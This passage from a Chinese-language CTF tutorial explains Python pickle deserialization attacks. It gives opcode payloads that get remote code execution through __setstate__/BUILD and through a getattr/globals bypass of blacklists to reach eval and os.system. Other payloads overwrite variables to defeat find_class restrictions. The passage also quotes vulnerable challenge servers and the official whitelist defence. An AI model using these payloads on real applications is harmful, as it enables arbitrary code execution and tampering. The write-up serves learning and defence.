<li>然后压入空字典，并打上<code>MARK</code>标记：<code>}(</code></li> <li>向栈中压入对应的元素，然后进行初始化：<code>Vname\ncsecret\nname\nVsign\ncsecret\nsign\nub.</code></li></ol> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token punctuation">:</span> <span class="token string">b&quot;c__main__\npickle_test\n)\x81}(Vname\ncsecret\nname\nVsign\ncsecret\nsign\nub.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我们再把替换后的opcode进行一次<code>dis</code>：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920140848.png" alt="image-20200920140848166">可以看到，原来<code>name</code>的值和<code>sign</code>的值都变成了<code>sercet</code>模块下引入的<code>name</code>和 <code>sign</code>，我们再把替换后的opcode进行一次base64编码（注意一定要使用python进行编码）：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912170916.png" alt="image-20200912170710534"></p> <p>然后传入我们所写的demo中（注意去掉<code>b</code>和<code>''</code>符号），造成了<code>name</code>和<code>sign</code>的变量覆盖，拿到flag：</p> <p><img src="https://i.loli.net/2020/09/20/4n3YdTvI7Mcgmea.png" alt="image-20200920141005441"></p> <p><code>secret.py</code>文件：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920141133.png" alt="image-20200920141100684"></p> <h2 id="rce：只有r操作符可以做到吗？"><a href="#rce：只有r操作符可以做到吗？" class="header-anchor">#</a> RCE：只有R操作符可以做到吗？</h2> <p>前文中我们提到了，<code>R</code>操作符会造成任意代码执行，<strong>那么只有<code>R</code>操作符可以进行RCE吗？</strong></p> <p>让我们来回想一下<code>b</code>操作符都干了一些什么事情：<strong>当解封时，如果类定义了<code>__setstate__()</code>，就会在已解封的状态下调用它。此时不要求实例的 <code>state</code> 对象必须是 <code>dict</code>。没有定义此方法的话，先前封存的 <code>state</code> 对象必须是 <code>dict</code>，且该 dict 内容会在解封时赋给新实例的<code>__dict__。</code></strong></p> <p>那么现在设想这样一种情况：如果一个类（暂且称之为<code>Test</code>），它原先是没有定义<code>__setstate__</code>方法的，如果我们现在使用<code>{&quot;__setstate__&quot;: os.system}</code>这个字典来初始化<code>test</code>类的对象（<code>b</code>操作符），现在这个对象便具有了<code>__setstate__</code>方法，之后我们再把待执行的命令作为参数（以<code>whoami</code>为例），再次使用<code>b</code>操作符来执行<code>BUILD</code>指令，由于此时对象存在<code>__setstate__</code>方法，所以便会执行<code>os.system('whoami')</code>，成功实现了RCE。</p> <p>按照思路构造opcode：</p> <ol><li>获取<code>Test</code>对象实例：<code>c__main__\nTest\n)\x81</code></li> <li>压入空字典，并打上<code>MARK</code>标记：<code>}(</code></li> <li>使用<code>__setstate__</code>来初始化对象，然后BUILD：<code>V__setstate__\ncos\nsystem\nub</code></li> <li>再使用<code>whoami</code>来初始化对象的<code>__setstate__</code>，然后BUILD：<code>Vwhoami\nb.</code></li></ol> <div class="language-python line-numbers-mode"><pre class="language-python"><code>date <span class="token operator">=</span> <span class="token string">b'c__main__\nTest\n)\x81}(V__setstate__\ncos\nsystem\nubVwhoami\nb.'</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>date<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>date<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200913145445.png" alt="image-20200913145445798"></p> <h2 id="重写find-class-：不一定绝对安全"><a href="#重写find-class-：不一定绝对安全" class="header-anchor">#</a> 重写find_class()：不一定绝对安全</h2> <p>在python官方文档中首先就提到了pickle模块是不安全的，**因为在默认情况下，解封将会导入在pickle数据中找到的任意类和对象。**官方给出了一种解决办法：**可以通过重写<code>find_class()</code>方法来控制要解封的对象。**通过白名单的方式来解决反序列化中的不安全问题，在很多题目中都是依赖于它来进行。</p> <p>关于<code>find_class()</code>：</p> <ul><li>从opcode角度来看：它会在opcode中出现<code>c</code>、<code>i</code>、<code>b'\x93'</code>的时候会被调用。</li> <li>从代码的角度来看：它会在opcode解析的时候调用一次。</li></ul> <p>下面的例子来自于python官方文档：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> builtins
<span class="token keyword">import</span> io
<span class="token keyword">import</span> pickle

safe_builtins <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'range'</span><span class="token punctuation">,</span>
    <span class="token string">'complex'</span><span class="token punctuation">,</span>
    <span class="token string">'set'</span><span class="token punctuation">,</span>
    <span class="token string">'frozenset'</span><span class="token punctuation">,</span>
    <span class="token string">'slice'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># Only allow safe classes from builtins.</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">&quot;builtins&quot;</span> <span class="token keyword">and</span> name <span class="token keyword">in</span> safe_builtins<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token comment"># Forbid everything else.</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">&quot;global '%s.%s' is forbidden&quot;</span> <span class="token operator">%</span>
                                     <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>重写了<code>Unpicker.find_class()</code>方法，采用了白名单的方式来限制可以使用的模块为<code>{'range', 'complex', 'set', 'frozenset', 'slice'}</code>。</p> <h3 id="rce"><a href="#rce" class="header-anchor">#</a> RCE</h3> <p>除了上面中提到的利用白名单方法来限制解封的对象，在题目中遇到的另一种很常见的题目就是利用黑名单来进行过滤：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> io
<span class="token keyword">import</span> builtins


<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">}</span>

    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'builtins'</span> <span class="token keyword">and</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>blacklist<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span>
            <span class="token string">&quot;global '%s.%s' is forbidden&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>

restricted_loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>上面的代码使用了黑名单过滤的方法，当前我们可以使用的模块就是<code>builtins</code>下的除黑名单之外的模块。不过题目并没有过滤<code>getattr</code>，我们可以通过该方法来获取到<code>builtins</code>下的<code>eval</code>等危险函数，一个常规的思路就是<code>getattar(builtins, 'eval')</code></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919142025.png" alt="image-20200919142018220"></p> <p>那么现在需要做的就是：</p> <ul><li>引入<code>builtins</code>模块，然后获取<code>getattr</code>方法</li> <li>再获取<code>builtins</code>模块，然后利用<code>getattr</code>来获取<code>eval</code>等危险函数</li> <li>利用<code>eval</code>函数来执行操作</li></ul> <p>好在代码中自动引入了<code>builtins</code>模块，所以我们可以很轻易地获得<code>getattr</code>方法</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919142743.png" alt="image-20200919142743229"></p> <p>然后就是第二步操作：获得<code>builtins</code>模块，这里的思路就是：</p> <ul><li>利用<code>getattr</code>获取到<code>builtins</code>模块下的<code>dict</code>中的<code>get</code>方法</li> <li>利用拿到的<code>get</code>方法去获取<code>builtins.globals()</code>中的<code>builtins</code>，拿到<code>builtins</code>模块</li></ul> <p>获取<code>get</code>方法：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919143234.png" alt="image-20200919143234698"></p> <p>然后拿<code>get</code>方法去<code>globals()</code>中的上下文中获取<code>builtins</code>模块</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919143456.png" alt="image-20200919143439267"></p> <p>现在已经拿到了<code>builtins</code>模块，然后利用<code>getattr</code>来从中获取<code>eval</code>等危险函数</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919143659.png" alt="image-20200919143659417"></p> <p>执行命令：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919143801.png" alt="image-20200919143752667"></p> <p>如果从正常的代码层面来看，整个流程可以用下面的代码来表示</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919144003.png" alt="image-20200919144003799"></p> <p>如果从栈的角度来看，整个流程可以用下面的一组图来表示：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919145800.png" alt="image-20200919145800501"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntR.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919150719.png" alt="image-20200919150719195"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntRp1\ncbuiltins\ngetattr\n(g1\nVeval\ntR(V__import__('os').system('whoami')\ntR.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200919151859.png" alt="image-20200919151800806"></p> <h3 id="变量覆盖"><a href="#变量覆盖" class="header-anchor">#</a> 变量覆盖</h3> <p>如果<code>find_class()</code>重写不当或者过滤不完全，依然会产生安全问题，来看下面的例子（四川大学2020校赛）：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>want2know<span class="token operator">=</span>xxx

<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'sys'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span>
        <span class="token punctuation">}</span>

    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># Only allow safe classes from builtins.</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">&quot;builtins&quot;</span> <span class="token keyword">and</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>blacklist<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token comment"># Forbid everything else.</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">&quot;global '%s.%s' is forbidden&quot;</span> <span class="token operator">%</span>
                                     <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

        pickle_data<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> pickle_data<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/pickle.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pickle_data<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


            op_blackli<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">]</span>

            <span class="token keyword">for</span> op <span class="token keyword">in</span> op_blackli<span class="token punctuation">:</span>
                <span class="token keyword">if</span> op <span class="token keyword">in</span> pickle_data<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">'数据非法！'</span><span class="token operator">+</span>op<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            data<span class="token operator">=</span>restricted_loads<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span>

        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>

            <span class="token keyword">return</span> <span class="token string">&quot;请输入正确的数据格式！&quot;</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            secret<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/pickle.html'</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> want2know<span class="token operator">==</span>secret<span class="token punctuation">:</span>
            <span class="token keyword">return</span> flag
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'欢迎使用HACHp1的pickle测试工具！'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'没有权限查看！\n'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p>获取的flag的条件是输入的<code>secret</code>和题目中的<code>want2know</code>相等。题目中过滤了一些可以进行RCE的函数，并且过滤了<code>getattr</code>，这就意味着没有办法重新获取<code>builtins</code>模块然后进行之后的操作。</p> <p>这道题目的解法就是利用<code>globals()</code>获取当前空间全局变量的字典，然后利用<code>s</code>或者<code>u</code>操作符来进行变量覆盖：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token punctuation">:</span> <span class="token string">b&quot;cbuiltins\nglobals\n(tR(Vwant2know\nVhahaha\nu.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>便于理解，我们可以查看它的汇编代码:</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920112014.png" alt="image-20200920112014731"></p> <p>这时候再查看<code>globals()</code>，已经完成了变量覆盖：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920112928.png" alt="image-20200920112119544"></p> <p>官方WP中给的解法：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token punctuation">:</span> <span class="token string">b&quot;(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'hachp1'\ns.&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200920112918.png" alt="image-20200920112430024"></p> <p>大同小异，只不过把<code>u</code>操作符换成了<code>s</code>操作符，然后进行了相应的修改。</p> <hr> <p>再看另外一种类型题目（来自高校战疫分享赛）：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token comment"># 只允许__main__模块</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">&quot;global '%s.%s' is forbidden&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
        
<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>题目中限制了引入的模块必须是<code>__main__</code>，这种过滤方法看似安全，<strong>但是所有引入<code>__main__</code>（主程序）的模块都可以被通过调用<code>__main__</code>模块来修改，造成了变量覆盖</strong>，我们可以通过下面的例子来分析这一问题：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> builtins
<span class="token keyword">import</span> io
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64


<span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name


<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span>
            <span class="token string">&quot;global '%s.%s' is forbidden&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>


pickle_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'input data:'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    exit<span class="token punctuation">(</span><span class="token string">'What do U want to do?'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> Animal<span class="token punctuation">:</span>
    exit<span class="token punctuation">(</span><span class="token string">&quot;Are U sure this is an animal?&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> data<span class="token punctuation">.</span>name <span class="token operator">==</span> Animal<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>secret<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Your name is incorrect!&quot;</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>这个demo中重写了<code>find_class()</code>方法，规定了引入的模块只能是<code>__mian__</code>，此外，还过滤了<code>R</code>操作符来防止任意代码执行。最后拿反序列化得到的<code>data.name</code>和<code>secret.name</code>进行比较，如果相等，则会返回flag。</p> <p>对于这个题目，解法如下：</p> <ol><li>先通过<code>__main__</code>模块引入<code>secret</code></li> <li>向栈中压入一个字典，内容为<code>{'name': '233'}</code>，这个字典中的<code>name</code>的值是我们自己定义的，我们下面会利用这个字典来覆盖掉我们未知的原来的<code>secret.name</code></li> <li>执行<code>b</code>操作符，使用这个字典来初始化<code>__mian__.secret.name</code>的值，完成了变量覆盖。</li> <li>执行<code>0</code>操作符，将栈顶元素弹掉，现在栈中为空。</li> 